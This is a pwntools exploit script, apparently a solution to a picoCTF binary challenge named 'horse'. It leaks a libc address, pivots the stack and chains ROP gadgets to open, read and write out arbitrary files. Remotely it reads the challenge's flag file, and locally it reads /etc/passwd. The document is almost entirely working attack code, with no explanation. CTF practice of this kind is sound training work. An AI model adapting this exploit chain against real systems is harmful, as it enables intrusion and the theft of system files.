from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './horse'
HOST = 'mars.picoctf.net'
PORT = 31809

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0xb97])

rsi_p1 = 0x00400c01
rdi = 0x00400c03
csu_load = 0x400bfa
csu_exec = 0x400be0
bss = 0x602040
rbp = 0x00400828
leave = 0x00400b5b

point = 0x400b6f

payload = ''
payload += 'A'*0x20
payload += flat(0x602018+0x20, point)
# payload += flat(csu_load, 0, 1, elf.got.write, 1, elf.got.write, 8, csu_exec)
# payload += flat(elf.sym.main)
# payload += flat(0, 0, 1, elf.got.read, 0, bss, 8, csu_exec)
payload = payload.ljust(0x80, '\x00')
if args.R:
	sleep(1)
r.send(payload)

payload = ''
payload += flat(elf.got.write)
payload += 'A'*0x18
payload += flat(0x602020+0x20, point)
payload = payload.ljust(0x80, '\x00')
if args.R:
	sleep(1)
r.send(payload)
r.recvuntil('\xc2\xb4\x0a')
r.recv(1)
leak = u64(r.recv(5)+'\x7f\x00\x00')
dbg('leak')
base = leak - 0x1111d0
dbg('base')
rax = base + 0x0004a54f
syscall = base + 0x00066229
rdx_p1 = base + 0x0011c371
rsi = base + 0x00151fcb
rdi = base + 0x0015b427
save_rax = base + 0x000374b0
add_edi_ebp = base + 0x001229f1
add_edi_esi = base + 0x00046a2b
setcontext = base + 0x580e4
mov_r10_rdx_jmprax = base + 0x0007bc1f

payload = ''
payload += "/app".ljust(0x20, '\x00')
# payload += flat(rdi+1)
payload += flat(rdi, 0, rsi, 0x602078, rax, 0, syscall, 0xdeadbeef)
payload = payload.ljust(0x80, '\x00')
if args.R:
	sleep(1)
r.send(payload)

payload = ''
payload += flat(rdi, 0, rsi, 0x6020c8, rdx_p1, 0xb00, 0, rax, 0, syscall)
payload = payload.ljust(0x80, '\x00')
if args.R:
	sleep(1)
r.send(payload)

addr = 0x602000
length = 0x200

'''
# getdents
payload = ''
payload += flat(rdi, 0x602020, rsi, 0, rdx_p1, constants.O_DIRECTORY, 0, rax, 2, syscall)
payload += flat(rdx_p1, 0x0000000000602140, 0, save_rax)
payload += flat(rdi, 0xdeadbeef, rsi, addr, rdx_p1, length, 0, rax, 0xd9, syscall)
payload += flat(rdi, 1, rsi, addr, rdx_p1, length, 0, rax, 1, syscall)
payload += flat(rdi, 0, rax, 0x3c, syscall)
payload = payload.ljust(0xb00, '\x00')
r.send(payload)
'''
payload = ''
payload += flat(rdi, 0, rsi, addr, rdx_p1, 0x100, 0, rax, 0, syscall)
payload += flat(rdi, addr, rsi, 0, rdx_p1, 0, 0, rax, 2, syscall)
payload += flat(rdx_p1, 0x00000000006021c8, 0, save_rax) # @0x602180
payload += flat(rax, rdi+1, rdx_p1, constants.MAP_PRIVATE, 0x12121, mov_r10_rdx_jmprax)
payload += flat(rdx_p1, 0x6021a0+0x30, 0, setcontext)
payload += flat(1, 2,3,4,3,0,7,0x11122233,9)
payload += flat(1, 0x12,0x13,0xdead0000,0x1000,0x0000000000602270+0x10,0x17,7,0x19)
payload += flat(1, 0x22, leave)
payload += flat(1, rax, 9, syscall, rdx_p1, 0x100, 0, rax, 1, rdi, 1, rsi, 0xdead0000, syscall,0x33,0x34,0x35,0x36,0x37,0x38,0x39)
payload = payload.ljust(0x400, '\x01')
if args.R:
	sleep(1)
r.send(payload)

if args.R:
	filename = "/app/flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt".ljust(0x100, '\x00')
else:
	filename = "/etc/passwd".ljust(0x100, '\x00')
if args.R:
	sleep(1)
r.send(filename)




r.interactive()
r.close()
